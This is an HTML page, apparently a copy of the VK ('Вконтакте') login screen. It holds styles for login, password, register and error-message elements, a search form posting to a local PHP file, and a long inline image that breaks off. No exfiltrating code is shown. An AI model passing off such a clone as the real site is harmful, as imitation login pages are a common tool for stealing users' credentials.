            background-color: #f0f2f5;
            margin-top: 27px;
            margin-left: 31px;
            border:1px solid #ced5e1;
            border-radius: 2px;
          }
    
          .condition p{
            margin-top: 20px;
            margin-left: 17px;
            font: 10pt/8pt bold;
            font-family: 'Roboto', sans-serif;
          }
    
          .login input[type="text"]{
            width: 244px;
            height:34px;
            margin-left: 234px;
            margin-top: 30px;
            background-color: #ffffff;
            border: 1px solid #e0e5e8;
            border-radius: 3px;
            outline:none;
          }
    
          .login input{
              padding: 0 12px;
          }
    
          .password input[type="password"]{
            width: 244px;
            height:34px;
            margin-left: 234px;
            margin-top: 14px;
            background-color: #ffffff;
            border: 1px solid #e0e5e8;
            border-radius: 3px;
            outline:none;
          }
    
          .password input{
              padding: 0 12px;
          }
    
          .checkbox input[type="checkbox"]{
            margin-top: 8px;
            margin-left: 215px;
            opacity: 0;
    
          }
    
          .checkbox{
            display: flex; 
          }
    
          .checkbox label{
            margin-left: 7px;
            margin-top: 17px;
            font: 10pt/8pt bold;
            font-family: 'Roboto', sans-serif;
          }
    
          .checkbox input+label {
            display: inline-flex;
            align-items: center;
            user-select: none;
          }
          .checkbox input+label::before {
            content: '';
            display: inline-block;
            width: 13px;
            height: 13px;
            flex-shrink: 0;
            flex-grow: 0;
            border: 1px solid #d4dadf;
            border-radius: 0.25em;
            margin-right: 0.5em;
            background-repeat: no-repeat;
            background-position: center center;
            background-size: 50% 50%;
          }
    
          .checkbox input:checked+label::before {
            border-color: #5181b8;
            background-color: #5181b8;
            background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8 8'%3e%3cpath fill='%23fff' d='M6.564.75l-3.59 3.612-1.538-1.55L0 4.26 2.974 7.25 8 2.193z'/%3e%3c/svg%3e");
          }
    
          .go input{
            width: 106px;
            height: 35px;
            margin-left: 235px;
            margin-top: 20px;
            background-color: #5181b8;
            color: #fffff6;
            border: 0px solid;
            border-radius: 2px;
          }
    
          .go input:hover{
            background-color: #5b88bd;
            cursor: pointer;
          }
    
          .register{
            margin-left: 350px;
            margin-top: -35px;
          }
    
          .register input{
            width: 156px;
            height: 35px;
            background-color: #5fb053;
            color: #fffff6;
            border: 0px solid;
            border-radius: 2px;
          }
    
          .register input:hover{
            background-color: #68b35d;
            cursor: pointer;
          }
    
          .forgot a{
            float: left;
            margin-left: 235px;
            padding-top: 40px;
            color: #275389;
            font: 13px/8px solid;
            font-family: 'Roboto', sans-serif;
          }
    
          .line{
            margin-left: 471px;
            margin-top: 88px;
          }
    
          .more{
            display: flex;
          }
    
          .more a{
            color: #396595;
            position: relative;
            top: 10px;
            font: 13px/11px solid;
            font-family: 'Roboto', sans-serif;
          }
    
          .more a:hover{
            text-decoration: underline;
          }
    
          .vk{
            margin-left: 10%;
          }
    
          .more p{
            margin-left: 67px;
            margin-top: -3px;
            font: 14px/12px solid;
            color: #909a9b;
            font-family: 'Roboto', sans-serif;
          }
    
          .more2{
            display: flex;
            flex-wrap: wrap;
            justify-content: space-around;
            margin-left: 99px;
          }
    
          .info{
            margin-left: 13px;
          }
    
          .more3{
            margin-left: 104px;
            display: flex;
            flex-wrap: wrap;
            justify-content: space-around;
          }
    
          .languages{
            margin-left: 10px;
          }
    
          .invalid{
            font-family: 'Roboto', sans-serif;
            font: 11pt/8pt bold;
            color: #b93939;
            text-align: center;
            margin-top: 10px;
            margin-left: 31px;
            background-color: #faebeb;
            width: 677px;
            padding: 10px;
            line-height: 15px;
          }
        </style>
        <meta charset="utf-8">
        <title>Вход | Вконтакте</title>
        <!--<link rel="stylesheet" type="text/css" href="style.css"> -->
        <link rel="preconnect" href="https://fonts.gstatic.com">
        <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap" rel="stylesheet">
        <link rel="icon" type="image/png" href="images/fav_logo.png">
      </head>
      <body>
        <header>
          <div class="logo">
            <a href="#"><img src="images/logo.png"></a>
          </div>
          <div class="home">
            <p>           </p>
          </div>
    
          <div>
            <form action="obrabotka.php" method="post" class="search">
              <div class="search">
                <input type="text" name="name" id="name" placeholder="Поиск">
              </div>
            </form>
          </div>
    
          <div class="magnifier">
            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAfQAAAH0CAYAAADL1t+KAAAACXBIWXMAAC4jAAAuIwF4pT92AAAIh2lUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNi4wLWMwMDIgNzkuMTY0MzUyLCAyMDIwLzAxLzMwLTE1OjUwOjM4ICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0RXZ0PSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VFdmVudCMiIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczpwaG90b3Nob3A9Imh0dHA6Ly9ucy5hZG9iZS5jb20vcGhvdG9zaG9wLzEuMC8iIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIxLjEgKFdpbmRvd3MpIiB4bXA6Q3JlYXRlRGF0ZT0iMjAyMC0wNC0yM1QxODoyNzowNyswNTowMCIgeG1wOk1ldGFkYXRhRGF0ZT0iMjAyMC0wNC0yM1QxODoyODoxOCswNTowMCIgeG1wOk1vZGlmeURhdGU9IjIwMjAtMDQtMjNUMTg6Mjg6MTgrMDU6MDAiIGRjOmZvcm1hdD0iaW1hZ2UvcG5nIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOmJhNjI2ZjZlLTIyNzMtMTg0Ni1iYTRkLWViMGFkZWEyNmE2MiIgeG1wTU06RG9jdW1lbnRJRD0iYWRvYmU6ZG9jaWQ6cGhvdG9zaG9wOjljZmU5NjMyLWMyNjgtNzc0Zi1iYmIxLWJkMmM3NGY4NmU4MyIgeG1wTU06T3JpZ2luYWxEb2N1bWVudElEPSJ4bXAuZGlkOmNiMTlhNDcxLTU2NTgtODQ0Yi05NzIzLTkxMjNiODhkYmQ4ZiIgcGhvdG9zaG9wOkNvbG9yTW9kZT0iMyI+IDx4bXBNTTpIaXN0b3J5PiA8cmRmOlNlcT4gPHJkZjpsaSBzdEV2dDphY3Rpb249ImNyZWF0ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6Y2IxOWE0NzEtNTY1OC04NDRiLTk3MjMtOTEyM2I4OGRiZDhmIiBzdEV2dDp3aGVuPSIyMDIwLTA0LTIzVDE4OjI3OjA3KzA1OjAwIiBzdEV2dDpzb2Z0d2FyZUFnZW50PSJBZG9iZSBQaG90b3Nob3AgMjEuMSAoV2luZG93cykiLz4gPHJkZjpsaSBzdEV2dDphY3Rpb249InNhdmVkIiBzdEV2dDppbnN0YW5jZUlEPSJ4bXAuaWlkOmE2N2Y2ZGQwLWM1ODctZjE0Ny05MzAwLWU5YWEyYzI3MTNiMyIgc3RFdnQ6d2hlbj0iMjAyMC0wNC0yM1QxODoyODoxOCswNTowMCIgc3RFdnQ6c29mdHdhcmVBZ2VudD0iQWRvYmUgUGhvdG9zaG9wIDIxLjEgKFdpbmRvd3MpIiBzdEV2dDpjaGFuZ2VkPSIvIi8+IDxyZGY6bGkgc3RFdnQ6YWN0aW9uPSJjb252ZXJ0ZWQiIHN0RXZ0OnBhcmFtZXRlcnM9ImZyb20gYXBwbGljYXRpb24vdm5kLmFkb2JlLnBob3Rvc2hvcCB0byBpbWFnZS9wbmciLz4gPHJkZjpsaSBzdEV2dDphY3Rpb249ImRlcml2ZWQiIHN0RXZ0OnBhcmFtZXRlcnM9ImNvbnZlcnRlZCBmcm9tIGFwcGxpY2F0aW9uL3ZuZC5hZG9iZS5waG90b3Nob3AgdG8gaW1hZ2UvcG5nIi8+IDxyZGY6bGkgc3RFdnQ6YWN0aW9uPSJzYXZlZCIgc3RFdnQ6aW5zdGFuY2VJRD0ieG1wLmlpZDpiYTYyNmY2ZS0yMjczLTE4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